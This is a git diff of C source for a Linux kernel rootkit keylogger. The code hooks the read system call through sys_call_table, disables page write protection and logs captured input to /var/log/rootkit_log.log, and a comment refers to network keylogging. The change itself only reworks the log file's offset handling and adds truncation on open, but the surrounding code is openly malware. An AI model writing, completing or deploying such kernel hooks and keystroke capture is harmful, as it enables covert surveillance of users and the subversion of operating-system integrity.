@@ -28,7 +28,6 @@ static struct file *fd;
 static int read_call_counter = 0;
 static spinlock_t read_lock;
 static unsigned long read_lock_flags;
-static loff_t foffset = 0;
 
 extern int send_flag; // For network keylogging
 
@@ -38,9 +37,9 @@ extern int send_flag; // For network keylogging
 void
 write_to_file(char *buf, long len)
 {
+	loff_t off = 0;
 	if (!IS_ERR (fd)) {
-		vfs_write(fd, buf, len, &foffset); 
-		foffset += len;
+		vfs_write(fd, buf, len, &off); 
 	}	
 }
 
@@ -93,7 +92,7 @@ hook_read(void)
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* create the file with write and append mode */
-	fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRWXU);
+	fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND|O_TRUNC, S_IRWXU);
 	
 	/* disable write protection */
 	disable_page_protection();
